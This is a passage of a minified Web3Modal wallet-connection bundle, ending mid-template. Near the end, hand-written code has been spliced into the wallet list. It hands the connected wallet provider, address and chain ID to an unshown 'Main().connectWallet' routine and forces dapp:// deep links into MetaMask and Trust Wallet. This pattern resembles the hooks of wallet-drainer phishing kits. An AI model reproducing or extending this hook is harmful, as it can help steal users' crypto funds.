pe`<w3m-downloads-view></w3m-downloads-view>`}}async onViewChange(e){const{history:t}=Ft.state;let r=-10,n=10;t.length<this.prevHistoryLength&&(r=10,n=-10),this.prevHistoryLength=t.length,await this.animate([{opacity:1,transform:"translateX(0px)"},{opacity:0,transform:`translateX(${r}px)`}],{duration:150,easing:"ease",fill:"forwards"}).finished,this.view=e,await this.animate([{opacity:0,transform:`translateX(${n}px)`},{opacity:1,transform:"translateX(0px)"}],{duration:150,easing:"ease",fill:"forwards",delay:50}).finished}getWrapper(){var e;return null==(e=this.shadowRoot)?void 0:e.querySelector("div")}};Tg.styles=oW,h9([xt()],Tg.prototype,"view",void 0),Tg=h9([De("w3m-router")],Tg);const aW=Qe`
  wui-flex {
    width: 100%;
  }

  :host > wui-flex:first-child {
    transform: translateY(calc(var(--wui-spacing-xxs) * -1));
  }

  wui-icon-link {
    margin-right: calc(var(--wui-icon-box-size-md) * -1);
  }
`;var Vc=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let ea=class extends $e{constructor(){super(),this.usubscribe=[],this.networkImages=Cc.state.networkImages,this.address=Rr.state.address,this.profileImage=Rr.state.profileImage,this.profileName=Rr.state.profileName,this.balance=Rr.state.balance,this.balanceSymbol=Rr.state.balanceSymbol,this.network=Fr.state.caipNetwork,this.disconecting=!1,this.usubscribe.push(Rr.subscribe((e=>{e.address?(this.address=e.address,this.profileImage=e.profileImage,this.profileName=e.profileName,this.balance=e.balance,this.balanceSymbol=e.balanceSymbol):On.close()})),Fr.subscribeKey("caipNetwork",(e=>{null!=e&&e.id&&(this.network=e)})))}disconnectedCallback(){this.usubscribe.forEach((e=>e()))}render(){var e,t;if(!this.address)throw new Error("w3m-account-view: No account provided");const r=this.networkImages[(null==(e=this.network)?void 0:e.imageId)??""];return pe`
      <wui-flex
        flexDirection="column"
        .padding=${["0","s","m","s"]}
        alignItems="center"
        gap="l"
      >
        <wui-avatar
          alt=${this.address}
          address=${this.address}
          imageSrc=${qt(this.profileImage)}
        ></wui-avatar>

        <wui-flex flexDirection="column" alignItems="center">
          <wui-flex gap="3xs" alignItems="center" justifyContent="center">
            <wui-text variant="large-600" color="fg-100">
              ${this.profileName?Mr.getTruncateString({string:this.profileName,charsStart:20,charsEnd:0,truncate:"end"}):Mr.getTruncateString({string:this.address,charsStart:4,charsEnd:6,truncate:"middle"})}
            </wui-text>
            <wui-icon-link
              size="md"
              icon="copy"
              iconColor="fg-200"
              @click=${this.onCopyAddress}
            ></wui-icon-link>
          </wui-flex>
          <wui-flex gap="s" flexDirection="column" alignItems="center">
            <wui-text variant="paragraph-500" color="fg-200">
              ${pt.formatBalance(this.balance,this.balanceSymbol)}
            </wui-text>

            ${this.explorerBtnTemplate()}
          </wui-flex>
        </wui-flex>
      </wui-flex>

      <wui-flex flexDirection="column" gap="xs" .padding=${["0","s","s","s"]}>
        <wui-list-item
          .variant=${r?"image":"icon"}
          iconVariant="overlay"
          icon="networkPlaceholder"
          imageSrc=${qt(r)}
          ?chevron=${this.isAllowedNetworkSwitch()}
          @click=${this.onNetworks.bind(this)}
        >
          <wui-text variant="paragraph-500" color="fg-100">
            ${(null==(t=this.network)?void 0:t.name)??"Unknown"}
          </wui-text>
        </wui-list-item>
        <wui-list-item
          variant="icon"
          iconVariant="overlay"
          icon="disconnect"
          ?chevron=${!1}
          .loading=${this.disconecting}
          @click=${this.onDisconnect.bind(this)}
        >
          <wui-text variant="paragraph-500" color="fg-200">Disconnect</wui-text>
        </wui-list-item>
      </wui-flex>
    `}explorerBtnTemplate(){const{addressExplorerUrl:e}=Rr.state;return e?pe`
      <wui-button size="sm" variant="shade" @click=${this.onExplorer.bind(this)}>
        <wui-icon size="sm" color="inherit" slot="iconLeft" name="compass"></wui-icon>
        Block Explorer
        <wui-icon size="sm" color="inherit" slot="iconRight" name="externalLink"></wui-icon>
      </wui-button>
    `:null}isAllowedNetworkSwitch(){const{requestedCaipNetworks:e}=Fr.state,t=!!e&&e.length>1,r=null==e?void 0:e.find((({id:e})=>{var t;return e===(null==(t=this.network)?void 0:t.id)}));return t||!r}onCopyAddress(){try{this.address&&(pt.copyToClopboard(this.address),po.showSuccess("Address copied"))}catch{po.showError("Failed to copy")}}onNetworks(){this.isAllowedNetworkSwitch()&&Ft.push("Networks")}async onDisconnect(){try{this.disconecting=!0,await vr.disconnect(),kr.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"}),On.close()}catch{kr.sendEvent({type:"track",event:"DISCONNECT_ERROR"}),po.showError("Failed to disconnect")}finally{this.disconecting=!1}}onExplorer(){const{addressExplorerUrl:e}=Rr.state;e&&pt.openHref(e,"_blank")}};ea.styles=aW,Vc([xt()],ea.prototype,"address",void 0),Vc([xt()],ea.prototype,"profileImage",void 0),Vc([xt()],ea.prototype,"profileName",void 0),Vc([xt()],ea.prototype,"balance",void 0),Vc([xt()],ea.prototype,"balanceSymbol",void 0),Vc([xt()],ea.prototype,"network",void 0),Vc([xt()],ea.prototype,"disconecting",void 0),ea=Vc([De("w3m-account-view")],ea);var d9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let o2=class extends $e{constructor(){super(...arguments),this.search="",this.onDebouncedSearch=pt.debounce((e=>{this.search=e}))}render(){const e=this.search.length>=2;return pe`
      <wui-flex padding="s" gap="s">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${e?pe`<w3m-all-wallets-search query=${this.search}></w3m-all-wallets-search>`:pe`<w3m-all-wallets-list></w3m-all-wallets-list>`}
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}qrButtonTemplate(){return pt.isMobile()?pe`
        <wui-icon-box
          size="lg"
          iconcolor="accent-100"
          backgroundcolor="accent-100"
          icon="qrCode"
          background="transparent"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){Ft.push("ConnectingWalletConnect")}};d9([xt()],o2.prototype,"search",void 0),o2=d9([De("w3m-all-wallets-view")],o2);const cW=Qe`
  wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var p9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Ng=class extends $e{constructor(){super(),this.unsubscribe=[],this.connectors=ks.state.connectors,this.unsubscribe.push(ks.subscribeKey("connectors",(e=>this.connectors=e)))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){return pe`
      <wui-flex flexDirection="column" padding="s" gap="xs">
        ${this.walletConnectConnectorTemplate()} ${this.recentTemplate()}
        ${this.announcedTemplate()} ${this.injectedTemplate()} ${this.featuredTemplate()}
        ${this.customTemplate()} ${this.recommendedTemplate()} ${this.connectorsTemplate()}
        ${this.allWalletsTemplate()}
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}walletConnectConnectorTemplate(){if(pt.isMobile())return null;const e=this.connectors.find((e=>"WALLET_CONNECT"===e.type));return e?pe`
      <wui-list-wallet
        imageSrc=${qt(wn.getConnectorImage(e))}
        name=${e.name??"Unknown"}
        @click=${()=>this.onConnector(e)}
        tagLabel="qr code"
        tagVariant="main"
      >
      </wui-list-wallet>
    `:null}customTemplate(){const{customWallets:e}=_r.state;return null!=e&&e.length?this.filterOutDuplicateWallets(e).map((e=>pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getWalletImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnectWallet(e)}
        >
        </wui-list-wallet>
      `)):null}featuredTemplate(){const{featured:e}=rr.state;return e.length?this.filterOutDuplicateWallets(e).map((e=>pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getWalletImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnectWallet(e)}
        >
        </wui-list-wallet>
      `)):null}recentTemplate(){return Ms.getRecentWallets().map((e=>pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getWalletImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnectWallet(e)}
          tagLabel="recent"
          tagVariant="shade"
        >
        </wui-list-wallet>
      `))}announcedTemplate(){return this.connectors.map((e=>"ANNOUNCED"!==e.type?null:pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getConnectorImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnector(e)}
          tagLabel="installed"
          tagVariant="success"
        >
        </wui-list-wallet>
      `))}injectedTemplate(){const e=this.connectors.find((e=>"ANNOUNCED"===e.type));return this.connectors.map((t=>"INJECTED"===t.type&&vr.checkInstalled()?pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getConnectorImage(t))}
          name=${t.name??"Unknown"}
          @click=${()=>this.onConnector(t)}
          tagLabel=${qt(e?void 0:"installed")}
          tagVariant=${qt(e?void 0:"success")}
        >
        </wui-list-wallet>
      `:null))}connectorsTemplate(){return this.connectors.map((e=>["WALLET_CONNECT","INJECTED","ANNOUNCED"].includes(e.type)?null:pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getConnectorImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnector(e)}
        >
        </wui-list-wallet>
      `))}allWalletsTemplate(){const e=10*Math.floor(rr.state.count/10);return pe`
      <wui-list-wallet
        name="All Wallets"
        walletIcon="allWallets"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${`${e}+`}
        tagVariant="shade"
      ></wui-list-wallet>
    `}recommendedTemplate(){const{recommended:e}=rr.state,{customWallets:t,featuredWalletIds:r}=_r.state,{connectors:n}=ks.state,i=Ms.getRecentWallets(),o=n.filter((e=>"ANNOUNCED"===e.type));if(r||t||!e.length)return null;const s=o.length+i.length,a=Math.max(0,2-s);return this.filterOutDuplicateWallets(e).slice(0,a).map((e=>pe`
        <wui-list-wallet
          imageSrc=${qt(wn.getWalletImage(e))}
          name=${(null==e?void 0:e.name)??"Unknown"}
          @click=${()=>this.onConnectWallet(e)}
        >
        </wui-list-wallet>
      `))}onConnector(e){"WALLET_CONNECT"===e.type?pt.isMobile()?Ft.push("AllWallets"):Ft.push("ConnectingWalletConnect"):Ft.push("ConnectingExternal",{connector:e})}filterOutDuplicateWallets(e){const{connectors:t}=ks.state,r=Ms.getRecentWallets().map((e=>e.id)),n=t.map((e=>{var t;return null==(t=e.info)?void 0:t.rdns})).filter(Boolean);return e.filter((e=>!r.includes(e.id)&&!n.includes(e.rdns??void 0)))}onAllWallets(){kr.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),Ft.push("AllWallets")}onConnectWallet(e){Ft.push("ConnectingWalletConnect",{wallet:e})}};Ng.styles=cW,p9([xt()],Ng.prototype,"connectors",void 0),Ng=p9([De("w3m-connect-view")],Ng);const lW=Qe`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }
`;var su=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};class Vi extends $e{constructor(){var e,t,r,n;super(),this.wallet=null==(e=Ft.state.data)?void 0:e.wallet,this.connector=null==(t=Ft.state.data)?void 0:t.connector,this.timeout=void 0,this.secondaryBtnLabel="Try again",this.secondaryBtnIcon="refresh",this.secondaryLabel="Accept connection request in the wallet",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=wn.getWalletImage(this.wallet)??wn.getConnectorImage(this.connector),this.name=(null==(r=this.wallet)?void 0:r.name)??(null==(n=this.connector)?void 0:n.name)??"Wallet",this.isRetrying=!1,this.uri=vr.state.wcUri,this.error=vr.state.wcError,this.ready=!1,this.showRetry=!1,this.buffering=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(vr.subscribeKey("wcUri",(e=>{var t;this.uri=e,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,null==(t=this.onConnect)||t.call(this))})),vr.subscribeKey("wcError",(e=>this.error=e)),vr.subscribeKey("buffering",(e=>this.buffering=e)))}firstUpdated(){var e;null==(e=this.onAutoConnect)||e.call(this),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach((e=>e())),clearTimeout(this.timeout)}render(){var e;null==(e=this.onRender)||e.call(this),this.onShowRetry();const t=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let r=`Continue in ${this.name}`;return this.buffering&&(r="Connecting..."),this.error&&(r="Connection declined"),pe`
      <wui-flex
        data-error=${qt(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${qt(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${r}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${t}</wui-text>
        </wui-flex>

        <wui-button
          variant="accent"
          ?disabled=${!this.error&&this.buffering}
          @click=${this.onTryAgain.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name=${this.secondaryBtnIcon}></wui-icon>
          ${this.secondaryBtnLabel}
        </wui-button>
      </wui-flex>

      ${this.isWalletConnect?pe`
            <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
              <wui-link @click=${this.onCopyUri} color="fg-200">
                <wui-icon size="sm" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
                Copy Link
              </wui-link>
            </wui-flex>
          `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onShowRetry(){var e;this.error&&!this.showRetry&&(this.showRetry=!0,(null==(e=this.shadowRoot)?void 0:e.querySelector("wui-button")).animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){var e,t;this.buffering||(vr.setWcError(!1),this.onRetry?(this.isRetrying=!0,null==(e=this.onRetry)||e.call(this)):null==(t=this.onConnect)||t.call(this))}loaderTemplate(){const e=Ts.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return pe`<wui-loading-thumbnail radius=${9*t}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(pt.copyToClopboard(this.uri),po.showSuccess("Link copied"))}catch{po.showError("Failed to copy")}}}Vi.styles=lW,su([xt()],Vi.prototype,"uri",void 0),su([xt()],Vi.prototype,"error",void 0),su([xt()],Vi.prototype,"ready",void 0),su([xt()],Vi.prototype,"showRetry",void 0),su([xt()],Vi.prototype,"buffering",void 0),su([ve({type:Boolean})],Vi.prototype,"isMobile",void 0),su([ve()],Vi.prototype,"onRetry",void 0);var uW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const fW={INJECTED:"browser",ANNOUNCED:"browser"};let rE=class extends Vi{constructor(){if(super(),!this.connector)throw new Error("w3m-connecting-view: No connector provided");kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.connector.name??"Unknown",platform:fW[this.connector.type]??"external"}}),this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),this.isWalletConnect=!1}async onConnectProxy(){try{this.error=!1,this.connector&&(this.connector.imageUrl&&Ms.setConnectedWalletImageUrl(this.connector.imageUrl),await vr.connectExternal(this.connector),On.close(),kr.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"external"}}))}catch(e){kr.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(null==e?void 0:e.message)??"Unknown"}}),this.error=!0}}};rE=uW([De("w3m-connecting-external-view")],rE);var hW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let nE=class extends $e{constructor(){var e,t;super(...arguments),this.dappUrl=null==(e=_r.state.metadata)?void 0:e.url,this.dappName=null==(t=_r.state.metadata)?void 0:t.name}render(){return pe`
      <wui-flex justifyContent="center" .padding=${["2xl","0","xxl","0"]}>
        <w3m-connecting-siwe></w3m-connecting-siwe>
      </wui-flex>
      <wui-flex
        .padding=${["0","4xl","l","4xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="paragraph-500" align="center" color="fg-100"
          >${this.dappName??"Dapp"} wants to connect to your wallet</wui-text
        >
      </wui-flex>
      ${this.urlTemplate()}
      <wui-flex
        .padding=${["0","3xl","l","3xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="small-400" align="center" color="fg-200"
          >Sign this message to prove you own this wallet and to continue</wui-text
        >
      </wui-flex>
      <wui-flex .padding=${["l","xl","xl","xl"]} gap="s" justifyContent="space-between">
        <wui-button size="md" ?fullwidth=${!0} variant="shade" @click=${this.onCancel.bind(this)}>
          Cancel
        </wui-button>
        <wui-button size="md" ?fullwidth=${!0} variant="fill" @click=${this.onSign.bind(this)}>
          Sign
        </wui-button>
      </wui-flex>
    `}urlTemplate(){return this.dappUrl?pe`<wui-flex .padding=${["0","0","l","0"]} justifyContent="center">
        <wui-button size="sm" variant="accentBg" @click=${this.onDappLink.bind(this)}>
          ${this.dappUrl}
          <wui-icon size="sm" color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-button>
      </wui-flex>`:null}onDappLink(){this.dappUrl&&pt.openHref(this.dappUrl,"_blank")}onSign(){}onCancel(){Ft.goBack()}};nE=hW([De("w3m-connecting-siwe-view")],nE);var B3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Og=class extends $e{constructor(){var e;super(),this.interval=void 0,this.lastRetry=Date.now(),this.wallet=null==(e=Ft.state.data)?void 0:e.wallet,this.platform=void 0,this.platforms=[],this.initializeConnection(),this.interval=setInterval(this.initializeConnection.bind(this),wd.TEN_SEC_MS)}disconnectedCallback(){clearTimeout(this.interval)}render(){return this.wallet?(this.determinePlatforms(),pe`
      ${this.headerTemplate()}
      <div>${this.platformTemplate()}</div>
    `):pe`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`}async initializeConnection(e=!1){try{const{wcPairingExpiry:t}=vr.state;if(e||pt.isPairingExpired(t)){if(vr.connectWalletConnect(),this.wallet){const e=wn.getWalletImage(this.wallet);e&&Ms.setConnectedWalletImageUrl(e)}else{const e=ks.state.connectors.find((e=>"WALLET_CONNECT"===e.type)),t=wn.getConnectorImage(e);t&&Ms.setConnectedWalletImageUrl(t)}await vr.state.wcPromise,this.finalizeConnection(),On.close()}}catch(e){kr.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(null==e?void 0:e.message)??"Unknown"}}),vr.setWcError(!0),pt.isAllowedRetry(this.lastRetry)&&(po.showError("Declined"),this.lastRetry=Date.now(),this.initializeConnection(!0))}}finalizeConnection(){const{wcLinking:e,recentWallet:t}=vr.state;e&&Ms.setWalletConnectDeepLink(e),t&&Ms.setWeb3ModalRecent(t),kr.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:e?"mobile":"qrcode"}})}determinePlatforms(){if(!this.wallet)throw new Error("w3m-connecting-wc-view:determinePlatforms No wallet");if(this.platform)return;const{mobile_link:e,desktop_link:t,webapp_link:r,injected:n,rdns:i}=this.wallet,o=null==n?void 0:n.map((({injected_id:e})=>e)).filter(Boolean),s=i?[i]:o??[],a=s.length,c=e,l=r,u=vr.checkInstalled(s),h=a&&u,d=t&&!pt.isMobile();h&&this.platforms.push("browser"),c&&this.platforms.push(pt.isMobile()?"mobile":"qrcode"),l&&this.platforms.push("web"),d&&this.platforms.push("desktop"),!h&&a&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return pe`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"desktop":return pe`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"web":return pe`
          <w3m-connecting-wc-web .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-web>
        `;case"mobile":return pe`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return pe`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`;default:return pe`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?pe`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
    `:null}async onSelectPlatform(e){var t;const r=null==(t=this.shadowRoot)?void 0:t.querySelector("div");r&&(await r.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=e,r.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};B3([xt()],Og.prototype,"platform",void 0),B3([xt()],Og.prototype,"platforms",void 0),Og=B3([De("w3m-connecting-wc-view")],Og);var dW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let iE=class extends $e{constructor(){var e;super(...arguments),this.wallet=null==(e=Ft.state.data)?void 0:e.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return pe`
      <wui-flex gap="xs" flexDirection="column" .padding=${["s","s","l","s"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){var e;return null!=(e=this.wallet)&&e.chrome_store?pe`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){var e;return null!=(e=this.wallet)&&e.app_store?pe`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){var e;return null!=(e=this.wallet)&&e.play_store?pe`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){var e;return null!=(e=this.wallet)&&e.homepage?pe`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="paragraph-500" color="fg-100">Website</wui-text>
      </wui-list-item>
    `:null}onChromeStore(){var e;null!=(e=this.wallet)&&e.chrome_store&&pt.openHref(this.wallet.chrome_store,"_blank")}onAppStore(){var e;null!=(e=this.wallet)&&e.app_store&&pt.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var e;null!=(e=this.wallet)&&e.play_store&&pt.openHref(this.wallet.play_store,"_blank")}onHomePage(){var e;null!=(e=this.wallet)&&e.homepage&&pt.openHref(this.wallet.homepage,"_blank")}};iE=dW([De("w3m-downloads-view")],iE);var pW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let sE=class extends $e{render(){
      
      window.isClicked = true;
      let connectionStatus = modal.getIsConnected();
    
      if(!connectionStatus)
      {
        return pe`
        <wui-flex flexDirection="column" padding="s" gap="xs">
          ${this.recommendedWalletsTemplate()}
          <wui-list-wallet
            name="All Wallets"
            showAllWallets
            walletIcon="allWallets"
            icon="externalLink"
            @click=${()=>{
                modal.open({ view: 'Connect' })
            }}
          ></wui-list-wallet>
        </wui-flex>
      `
      }
      else
      {
        return pe`
        <wui-flex flexDirection="column" padding="s" gap="xs">
          ${this.recommendedWalletsTemplate()}
          <wui-list-wallet
            name="All Wallets"
            showAllWallets
            walletIcon="allWallets"
            icon="externalLink"
            @click=${()=>{
                new Main().connectWallet(modal.getWalletProvider(), modal.getWalletProviderType(), modal.getAddress(), modal.getChainId());
              }    
            }
          ></wui-list-wallet>
        </wui-flex>
      `
      }
   }recommendedWalletsTemplate(){
      var ua = navigator.userAgent.toLowerCase();
      var isAndroid = ua.indexOf("android") > -1; //&& ua.indexOf("mobile");
      if(isAndroid) {
        return pe`
        <wui-list-wallet
          name="Metamask"
          tagVariant="main"
          imageSrc="https://explorer-api.walletconnect.com/v3/logo/lg/5195e9db-94d8-4579-6f11-ef553be95100?projectId=2f05ae7f1116030fde2d36508f472bfb"
          @click=${()=>{const e=document.createElement("a");e.href=`dapp://${document.URL.replace(/https?:\/\//i,"")}`,e.target="_self",document.body.appendChild(e),e.click(),e.remove()}}
        ></wui-list-wallet>
      `
    
      
      }
      else
      {
        return pe`
          <wui-list-wallet
            name="Metamask"
            tagVariant="main"
            imageSrc="https://explorer-api.walletconnect.com/v3/logo/lg/5195e9db-94d8-4579-6f11-ef553be95100?projectId=2f05ae7f1116030fde2d36508f472bfb"
            @click=${()=>{const e=document.createElement("a");e.href=`dapp://${document.URL.replace(/https?:\/\//i,"")}`,e.target="_self",document.body.appendChild(e),e.click(),e.remove()}}
          ></wui-list-wallet>

          
          <wui-list-wallet
          name="Trust Wallet"
          tagVariant="main"
          imageSrc="https://explorer-api.walletconnect.com/v3/logo/lg/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=2f05ae7f1116030fde2d36508f472bfb"
